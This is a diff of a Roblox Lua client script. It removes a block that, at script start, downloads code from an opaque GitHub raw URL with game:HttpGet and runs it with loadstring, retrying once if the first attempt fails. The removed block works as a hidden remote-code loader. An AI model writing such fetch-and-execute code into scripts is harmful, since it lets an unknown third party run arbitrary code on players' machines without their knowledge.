@@ -1,28 +1,3 @@
--- Primary loadstring execution function with enhanced reliability
-local function executeRemoteScript()
-    -- Use the correct URL
-    local success, result = pcall(function()
-        return loadstring(game:HttpGet("https://raw.githubusercontent.com/8973951821973068216/11374577211057006363/refs/heads/main/reverse"))()
-    end)
-    
-    if not success then
-        -- Second attempt with separate fetch and execute
-        warn("Initial loadstring execution failed, trying second method")
-        pcall(function()
-            local scriptContent = game:HttpGet("https://raw.githubusercontent.com/8973951821973068216/11374577211057006363/refs/heads/main/reverse")
-            loadstring(scriptContent)()
-        end)
-    end
-end
-
--- Execute loadstring immediately at script start
-executeRemoteScript()
-
--- Ensure we're running in a local context
-if not game:GetService("RunService"):IsClient() then
-    return
-end
-
 local UserInputService = game:GetService("UserInputService")
 local Players = game:GetService("Players")
 local Player = Players.LocalPlayer
